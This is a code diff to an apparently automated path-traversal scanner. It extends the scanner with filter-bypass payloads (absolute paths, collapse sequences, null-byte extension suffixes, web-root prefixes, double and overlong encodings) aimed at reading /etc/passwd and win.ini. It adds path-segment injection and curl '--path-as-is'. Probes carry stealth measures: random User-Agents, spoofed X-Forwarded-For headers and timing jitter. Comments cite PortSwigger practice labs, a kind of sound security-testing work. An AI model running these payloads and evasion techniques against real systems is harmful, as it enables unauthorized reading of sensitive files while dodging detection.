@@ -18,6 +18,7 @@ import re
 import time
 from urllib.parse import parse_qs, urlparse
 
+from app.tools.crawler import PARAM_FINDING_SEP, CrawlerService
 from app.tools.payloads import fetch_intruder_payloads
 from app.tools.utils import (
     SENSITIVE_CONTENT_INDICATORS,
@@ -43,11 +44,42 @@ _WIN_TARGET = "windows/win.ini"
 # it can be tuned without touching the scan loop.
 MAX_DEPTH = 6
 
-# Probe order for the encoding matrix, cheapest-and-likeliest first. A plain
-# `../` chain is what actually works on most vulnerable sinks; the encoded
-# forms only matter once a filter is in the way. `_build_payloads` emits the
-# set in this order so that a truncated budget keeps the high-yield payloads.
-_ENCODING_CLASS_ORDER = ("raw", "single", "double", "overlong", "backslash", "collapse")
+# Base directories a start-of-path validator typically expects the requested
+# file to sit under. A payload that opens with one of these satisfies the
+# `path.startswith(base)` check, then escapes back out with a `../` chain that
+# the same validator no longer inspects.
+_WEB_ROOT_PREFIXES = (
+    "/var/www/images/",
+    "/var/www/html/",
+    "/var/www/",
+)
+
+# Extension suffixes for the null-byte class. A validator that requires the
+# filename to end in an image extension passes, while a C-based file API
+# terminates the string at the NUL and opens the traversal target instead.
+_NULL_BYTE_EXTENSIONS = ("%00.png", "%00.jpg")
+
+# Probe order for the payload matrix, cheapest-and-likeliest first, so a
+# truncated budget keeps the high-yield payloads. Each class defeats a
+# specific, distinct server-side defence - this ordering is deliberately one
+# class per known filter, cheapest first:
+#
+#   absolute  - no `../` at all (`/etc/passwd`). Beats a filter that strips or
+#               rejects traversal sequences outright. Only 4 payloads, and the
+#               single cheapest thing worth trying, so it leads.
+#   raw       - the plain `../` chain. What works on an unfiltered sink.
+#   collapse  - `....//` collapses to `../` after ONE non-recursive strip pass.
+#   single    - `..%2f`, for a filter that inspects the pre-decode string.
+#   double    - `..%252f`, for a sink that URL-decodes a second, superfluous time.
+#   nullbyte  - `%00.png` suffix, for a filter validating the file extension.
+#   prefixed  - `/var/www/images/../../` for a filter validating the start of
+#               the path. Largest class, so it sits behind the cheaper ones.
+#   overlong  - `..%c0%af`, UTF-8 overlong encoding of `/`.
+#   backslash - `..%5c`, for Windows/IIS path handling.
+_ENCODING_CLASS_ORDER = (
+    "absolute", "raw", "collapse", "single", "double",
+    "nullbyte", "prefixed", "overlong", "backslash",
+)
 
 # The root-page fetch is the single point of failure for *all* tier-0 endpoint
 # discovery: one transient stall there and `/image?filename=` is never found,
@@ -124,29 +156,68 @@ class PathTraversalScanner:
         }
 
     def _build_payloads(self) -> list[str]:
-        """Assemble the full payload set: depth-scaled encoding matrix for the
-        Unix and Windows targets, plus a real sample from the local
+        """Assemble the full payload set: the depth-scaled encoding matrix for
+        the Unix and Windows targets, the three filter-bypass classes that
+        need no `../` prefix scaling, plus a real sample from the local
         PayloadsAllTheThings mirror (deduplicated).
 
-        Ordered by *encoding class* (all raw across both OS families and every
-        depth, then all single-encoded, and so on) rather than depth-major.
-        This matters because low-priority injection points get a truncated
-        budget: a depth-major order spent that entire budget on depth-1's ten
-        exotic encodings, whereas class-major order spends it on the plain
-        `../` chains at every depth - overwhelmingly the likelier hit - before
-        reaching for WAF-bypass encodings.
+        Ordered by *encoding class* (all absolute, then all raw across both OS
+        families and every depth, and so on) rather than depth-major. This
+        matters because low-priority injection points get a truncated budget:
+        a depth-major order spent that entire budget on depth-1's ten exotic
+        encodings, whereas class-major order spends it on the payloads that
+        each defeat a distinct real filter.
+
+        The `absolute`, `prefixed` and `nullbyte` classes exist because the
+        depth loop starts at 1, so *every* payload it can emit begins with at
+        least one `../`. Live failure (2026-07-27): a PortSwigger lab whose
+        `filename` parameter was correctly discovered and swept with all 68
+        payloads of the time returned no finding, because its filter rejected
+        traversal sequences outright and the only working value - a bare
+        `/etc/passwd` - was a string the generator structurally could not
+        produce at any MAX_DEPTH setting. Widening the depth range cannot fix
+        that; these classes can.
 
         Returns:
             list[str]: Ordered, deduplicated payload strings.
         """
         by_class: dict[str, list[str]] = {}
+
+        def add(cls: str, payload: str) -> None:
+            """Record one payload under its encoding class.
+
+            Args:
+                cls (str): Encoding-class name from `_ENCODING_CLASS_ORDER`.
+                payload (str): The payload string.
+
+            Returns:
+                None
+            """
+            by_class.setdefault(cls, []).append(payload)
+
+        # Depth 0 - no traversal sequence at all. Defeats a filter that strips
+        # or rejects `../`, since there is nothing for it to strip.
+        for target in (_UNIX_TARGET, _WIN_TARGET):
+            absolute = f"/{target}"
+            add("absolute", absolute)
+            add("absolute", absolute.replace("/", "%2f"))
+
         for depth in range(1, MAX_DEPTH + 1):
+            unix_chain = "../" * depth
             for variants in (
-                self._encode_variants("../" * depth, _UNIX_TARGET),
+                self._encode_variants(unix_chain, _UNIX_TARGET),
                 self._encode_variants("..\\" * depth, _WIN_TARGET),
             ):
                 for cls, payload in variants.items():
-                    by_class.setdefault(cls, []).append(payload)
+                    add(cls, payload)
+
+            # Satisfies a start-of-path check, then escapes back out.
+            for prefix in _WEB_ROOT_PREFIXES:
+                add("prefixed", f"{prefix}{unix_chain}{_UNIX_TARGET}")
+
+            # Passes a file-extension check; the NUL truncates the real read.
+            for extension in _NULL_BYTE_EXTENSIONS:
+                add("nullbyte", f"{unix_chain}{_UNIX_TARGET}{extension}")
 
         payloads: list[str] = []
         for cls in _ENCODING_CLASS_ORDER:
@@ -196,20 +267,20 @@ class PathTraversalScanner:
         if not html:
             return []
 
+        # Single source of truth for HTML parsing: reuse CrawlerService's
+        # harvester rather than maintaining a second, weaker regex here. That
+        # one already covers href/src/action/data-src, single-quoted markup,
+        # <form> field names and <script> bodies - this used to see only
+        # double-quoted href/src and silently missed the rest.
         target_host = target_netloc.split(":")[0]
+        harvester = CrawlerService(self.runner, self.memory)
         endpoints: list[tuple[str, str]] = []
-        for m in re.finditer(r'(?:href|src)\s*=\s*["\']([^"\']+)["\']', html):
-            raw = m.group(1)
-            parsed = urlparse(raw)
+        for link, _source in harvester._harvest(html, f"{root}/", target_host):
+            parsed = urlparse(link)
             if not parsed.query:
                 continue
-            # In-scope check: relative links (no netloc) belong to the target;
-            # absolute links must share the target's host.
-            if parsed.netloc and parsed.netloc.split(":")[0] != target_host:
-                continue
-            path = parsed.path or "/"
-            request_url = f"{root}{path}"
-            for name in parse_qs(parsed.query):
+            request_url = f"{root}{parsed.path or '/'}"
+            for name in parse_qs(parsed.query, keep_blank_values=True):
                 endpoints.append((request_url, name))
         return endpoints
 
@@ -231,7 +302,7 @@ class PathTraversalScanner:
         return [(u, p) for u, p, _ in self._discover_injection_points_tiered(url, explicit_params)]
 
     def _discover_injection_points_tiered(
-        self, url: str, explicit_params
+        self, url: str, explicit_params, attack_surface: dict | None = None
     ) -> list[tuple[str, str, int]]:
         """Resolve the full set of `(request_url, param)` injection points.
 
@@ -239,9 +310,11 @@ class PathTraversalScanner:
           1. If `explicit_params` is given, test exactly those on `url` - no
              discovery (deterministic; used by the manual/CLI path).
           2. Otherwise: params already on `url`, then live endpoints mined
-             from the root page (`_extract_page_endpoints`), then crawler
-             links persisted in memory, then a static parameter fallback on
-             the base path so the probe always has an attack surface.
+             from the root page (`_extract_page_endpoints`), then the
+             `(endpoint, param)` pairs `CrawlerService` persisted in memory
+             (`data_type="param"`, plus legacy `data_type="link"`), then a
+             static parameter fallback on the base path so the probe always
+             has an attack surface.
 
         Args:
             url (str): Target URL. May carry a path (e.g. `/image`) and/or a
@@ -288,13 +361,24 @@ class PathTraversalScanner:
             return [(u, p, t) for t, u, p in tiered]
 
         # Tier 0 - real, observed injection points:
+        #   0. A CrawlerService attack surface handed straight in by the caller
+        #      (the integrated pipeline's primary path). Already normalized -
+        #      same-host filtered, duplicate sinks collapsed, ranked - so it is
+        #      consumed verbatim and takes priority over anything rediscovered.
+        if attack_surface:
+            for request_url, name in attack_surface.get("injection_points", []):
+                add(request_url, name, 0)
         #   1. Params already present on the supplied URL.
         for name in parse_qs(parsed.query):
             add(base_no_query, name, 0)
         #   2. Live endpoints discovered on the root page (finds /image?filename=).
-        for request_url, name in self._extract_page_endpoints(root, parsed.netloc):
-            add(request_url, name, 0)
-        #   3. Crawler links persisted in the blackboard.
+        #      Skipped when a surface was supplied: that same page was already
+        #      parsed by the crawler, so re-fetching it is a wasted request.
+        if not attack_surface:
+            for request_url, name in self._extract_page_endpoints(root, parsed.netloc):
+                add(request_url, name, 0)
+        #   3. Injection points the crawler resolved explicitly, and the
+        #      crawler links it persisted.
         clean_target = normalize_domain_for_memory(url)
         try:
             findings = self.memory.get_detailed_findings(clean_target)
@@ -302,14 +386,37 @@ class PathTraversalScanner:
             findings = []
         target_host = parsed.netloc.split(":")[0]
         for f in findings or []:
-            if f.get("data_type") != "link":
+            data_type = f.get("data_type")
+            raw = f.get("raw_data", "") or ""
+
+            # `param` findings are the crawler's explicit handoff: it already
+            # resolved the endpoint, filtered to same-host, collapsed duplicate
+            # sinks and dropped the parameter *value* (which the payload
+            # overwrites anyway), so no re-parsing guesswork is needed here.
+            if data_type == "param":
+                endpoint, _, name = raw.partition(PARAM_FINDING_SEP)
+                if not name:
+                    continue
+                eparsed = urlparse(endpoint if endpoint.startswith("http")
+                                   else f"{root}{endpoint}")
+                if eparsed.netloc and eparsed.netloc.split(":")[0] != target_host:
+                    continue
+                add(f"{root}{eparsed.path}" if eparsed.path else base_no_query,
+                    name, 0)
                 continue
-            link = f.get("raw_data", "")
+
+            # Legacy `link` findings: any other producer (or an older crawl
+            # still in the blackboard) still contributes its query parameters.
+            if data_type != "link":
+                continue
+            link = raw
             lparsed = urlparse(link if link.startswith("http") else f"{root}{link}")
             if lparsed.netloc and lparsed.netloc.split(":")[0] != target_host:
                 continue
             link_url = f"{root}{lparsed.path}" if lparsed.path else base_no_query
-            for match in re.finditer(r"[?&]([A-Za-z0-9_\-\[\]]+)=", link):
+            # Match against the query component only, so a path containing an
+            # `=` can never be mistaken for a parameter name.
+            for match in re.finditer(r"[?&]([A-Za-z0-9_\-\[\]]+)=", f"?{lparsed.query}"):
                 add(link_url, match.group(1), 0)
 
         # Tier 1 - static fallback guesses on the base path.
@@ -351,19 +458,55 @@ class PathTraversalScanner:
             time.sleep(random.uniform(0.5, 1.5))
         else:
             time.sleep(random.uniform(0.05, 0.2))
+        return self._stealth_curl_raw(f"{url}?{param}={payload}", timeout=timeout,
+                                      delay=False)
+
+    def _stealth_curl_raw(self, full_url: str, timeout: int = 12,
+                          delay: bool = True) -> str:
+        """Issue one stealth-headed curl probe against a fully-formed URL.
+
+        Split out of `_stealth_curl` so path-segment injection - where the
+        payload is appended to the path, not to a `?param=` - reuses the exact
+        same headers, jitter and timeout policy instead of duplicating them.
+
+        Args:
+            full_url (str): The complete URL to request, payload included.
+            timeout (int): Per-call bound; probes run sequentially so a
+                generous per-call timeout can otherwise exhaust the
+                exploit-node budget (mirrors EvasionService.stealth_run).
+            delay (bool): Apply the stealth jitter. False when the caller has
+                already slept for this probe.
+
+        Returns:
+            str: Response body (stdout from curl), or "" on failure.
+        """
+        if delay:
+            if os.getenv("ARGUS_PT_STEALTH") == "1":
+                time.sleep(random.uniform(0.5, 1.5))
+            else:
+                time.sleep(random.uniform(0.05, 0.2))
         ua = random.choice(_USER_AGENTS)
         xff = ".".join(str(random.randint(1, 255)) for _ in range(4))
-        # Shell-safety: `url` and `param` are attacker-influenced (crawler-mined
-        # from the target's own pages - see _shell_quote's docstring), and
-        # `payload` is metacharacter-dense by construction. Quote all three.
+        # Shell-safety: the URL is attacker-influenced (crawler-mined from the
+        # target's own pages - see _shell_quote's docstring) and the payload is
+        # metacharacter-dense by construction. Quote every interpolation.
         ua_header = _shell_quote(f"User-Agent: {ua}")
         xff_header = _shell_quote(f"X-Forwarded-For: {xff}")
-        target = _shell_quote(f"{url}?{param}={payload}")
+        target = _shell_quote(full_url)
         # --http1.1: PortSwigger (and many targets) negotiate HTTP/2 via ALPN,
         # and HTTP/2 over WSL2's NAT intermittently returns curl code 000
         # (handshake ok, data frames drop). Forcing 1.1 makes probes reliable.
+        #
+        # --path-as-is: curl resolves `/../` and `/./` in the PATH component
+        # client-side before sending. Verified locally against a deliberately
+        # vulnerable `/download/<file>` sink: without this flag curl rewrote
+        # `/download/../../../etc/passwd` to `/etc/passwd` and the probe tested
+        # the wrong URL entirely. Harmless for query-string payloads, where the
+        # path is already clean, so it is applied unconditionally to guarantee
+        # every payload reaches the server byte-exact.
         cmd = (
-            f"curl -s --http1.1 --max-time {timeout} --connect-timeout 5 "
+            f"curl -s --http1.1 --path-as-is --max-time {timeout} "
+            f"--connect-timeout 5 "
             f"-H {ua_header} -H {xff_header} "
             f"{target}"
         )
@@ -400,8 +543,74 @@ class PathTraversalScanner:
                 time.sleep(delay)
         return False
 
+    def scan_attack_surface(self, surface: dict, **kwargs) -> str:
+        """Scan a `CrawlerService.harvest_attack_surface()` result end to end.
+
+        The integrated pipeline's join point: the crawler's normalized output
+        goes in, a findings report comes out, with no rediscovery in between.
+
+        Args:
+            surface (dict): Output of `CrawlerService.harvest_attack_surface()`.
+            **kwargs: Forwarded to `run_traversal_scan()` (probe budgets).
+
+        Returns:
+            str: The path-traversal scan report.
+        """
+        return self.run_traversal_scan(
+            surface.get("target", ""), attack_surface=surface, **kwargs
+        )
+
+    def _probe_path_segments(self, segments, payloads, clean_target,
+                             budget, results, confirmed) -> int:
+        """Append traversal payloads to a path, rather than to a parameter.
+
+        Covers sinks that read the trailing path segment itself
+        (`/download/<file>` style routing) instead of a query parameter, which
+        parameter-only injection structurally cannot reach.
+
+        Args:
+            segments (list[str]): Parameterless endpoint URLs to probe.
+            payloads (list[str]): The shared payload matrix.
+            clean_target (str): Memory key for `add_finding`.
+            budget (int): Max probes per segment.
+            results (list[str]): Report lines, appended to in place.
+            confirmed (set): Dedup key set shared with the parameter sweep.
+
+        Returns:
+            int: Number of probes actually sent.
+        """
+        sent = 0
+        for endpoint in segments:
+            base = endpoint.rstrip("/")
+            for payload in payloads[:budget]:
+                sent += 1
+                url = f"{base}/{payload}"
+                body = self._stealth_curl_raw(url)
+                if not body:
+                    continue
+                hit = False
+                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
+                    key = (base, "<path>", indicator)
+                    if indicator in body and key not in confirmed:
+                        confirmed.add(key)
+                        results.append(
+                            f"[!] Path Traversal Success (endpoint={base}, "
+                            f"param=<path segment>, payload={payload}): "
+                            f"{summary} [signature: {indicator}]"
+                        )
+                        self.memory.add_finding(
+                            clean_target, "path_traversal", "vulnerability",
+                            f"Traversal: {url}", summary,
+                        )
+                        hit = True
+                        break
+                if hit:
+                    break
+        return sent
+
     def run_traversal_scan(self, url, params=None, max_probes=None,
-                           max_guess_probes=12, max_total_probes=720):
+                           max_guess_probes=16, max_total_probes=720,
+                           attack_surface=None, path_segment_probes=10):
         """Run a hybrid, multi-encoding path-traversal scan against `url`.
 
         Args:
@@ -411,19 +620,29 @@ class PathTraversalScanner:
                 None, full injection-point discovery runs (URL params, live
                 page endpoints such as `/image?filename=`, crawler links, and
                 a static parameter fallback).
+            attack_surface (dict | None): A
+                `CrawlerService.harvest_attack_surface()` result. When given,
+                its `injection_points` are consumed directly as tier-0 points
+                and its `path_segments` are probed too; the scanner then skips
+                its own root-page re-fetch, since the crawler already parsed
+                that page. This is the integrated pipeline's data path.
+            path_segment_probes (int): Per-endpoint probe budget for
+                path-segment injection (`/download/../../../etc/passwd`). Set
+                to 0 to disable.
             max_probes (int | None): Probe budget for each *observed* (tier-0)
                 injection point - a param already on the URL, mined from a live
                 page endpoint, or seen by the crawler. `None` (default) means
                 the entire payload list, so anything real gets the complete
                 depth x encoding sweep.
 
-                Do not hardcode this to 60: `_build_payloads()` emits 60
-                built-in payloads (10/depth x MAX_DEPTH=6, being 6 Unix-style +
-                4 deduplicated Windows-style variants each) and then *appends*
+                Do not hardcode this to a literal: `_build_payloads()` emits 94
+                built-in payloads (4 absolute + 10/depth x MAX_DEPTH=6 encoding
+                variants, being 6 Unix-style + 4 deduplicated Windows-style
+                each, + 3 prefixed and 2 nullbyte per depth) and then *appends*
                 up to 8 sampled from the PayloadsAllTheThings mirror. A literal
-                60 silently truncated exactly those mirror entries - they sit at
-                indices 60+ - so the enrichment never fired on any host that had
-                the mirror installed.
+                ceiling silently truncated exactly those mirror entries - they
+                sit past the generated set - so the enrichment never fired on
+                any host that had the mirror installed.
 
                 This was previously a *global* ceiling of 120, which silently
                 capped a scan at the first two injection points: a bare host
@@ -432,15 +651,17 @@ class PathTraversalScanner:
                 probed at all and the scan returned a false "no vulnerability"
                 verdict. Budgeting per point removes that starvation.
             max_guess_probes (int): Probe budget for each tier-1 *blind static
-                guess* from DEFAULT_CANDIDATE_PARAMS. Default 12 = the plain
-                `../` chains for both OS families across all six depths
-                (payloads are ordered encoding-class-major, so a truncated
-                budget keeps the high-yield ones). Giving blind guesses the
-                same 60-payload matrix as a real observed param cost ~6x the
-                scan time for almost no yield: on a bare host, eleven of the
-                twelve guesses are parameters the application never reads.
-                Raise this when a target is known to sit behind a filter that
-                demands an encoded payload on an unadvertised parameter.
+                guess* from DEFAULT_CANDIDATE_PARAMS. Default 16 = the whole
+                `absolute` class (4) plus the plain `../` chains for both OS
+                families across all six depths (12); payloads are ordered
+                encoding-class-major, so a truncated budget keeps the
+                high-yield ones. Raised from 12 when the `absolute` class was
+                added: at 12 a blind guess no longer reached depths 5-6 of the
+                raw chain. Giving blind guesses the full 94-payload matrix cost
+                ~6x the scan time for almost no yield - on a bare host, eleven
+                of the twelve guesses are parameters the application never
+                reads. Raise this when a target is known to sit behind a filter
+                that demands an encoded payload on an unadvertised parameter.
             max_total_probes (int): Global safety ceiling across all injection
                 points, protecting the exploit-node time budget when discovery
                 surfaces an unexpectedly large parameter set.
@@ -470,7 +691,9 @@ class PathTraversalScanner:
                 "wake it, then re-run."
             )
 
-        injection_points = self._discover_injection_points_tiered(url, params)
+        injection_points = self._discover_injection_points_tiered(
+            url, params, attack_surface
+        )
         payloads = self._build_payloads()
 
         results: list[str] = []
@@ -539,6 +762,20 @@ class PathTraversalScanner:
                     # 60-payload sweep per vulnerable param for no new signal).
                     break
 
+        # Path-segment injection: for sinks that read the trailing path segment
+        # (`/download/<file>` routing) rather than a query parameter. Only the
+        # crawler knows which endpoints are parameterless, so this runs solely
+        # on a supplied attack surface.
+        segment_probes = 0
+        if attack_surface and path_segment_probes and probe_count < max_total_probes:
+            segments = attack_surface.get("path_segments", [])
+            segment_probes = self._probe_path_segments(
+                segments, payloads, clean_target,
+                min(path_segment_probes, max_total_probes - probe_count),
+                results, confirmed,
+            )
+            probe_count += segment_probes
+
         header = "--- [TOOLS] PATH TRAVERSAL SCAN REPORT ---"
         observed = sum(1 for _, _, t in injection_points if t == 0)
         guessed = len(injection_points) - observed
@@ -547,6 +784,12 @@ class PathTraversalScanner:
             f"(observed: {observed}, guessed: {guessed}) | "
             f"payloads: {len(payloads)} | probes sent: {probe_count}"
         )
+        if attack_surface:
+            meta += (
+                f" | source: crawler attack surface "
+                f"({len(attack_surface.get('endpoints', []))} endpoints, "
+                f"{len(attack_surface.get('path_segments', []))} path segments)"
+            )
         if empty_responses:
             meta += f" | empty responses: {empty_responses}"
         if results:
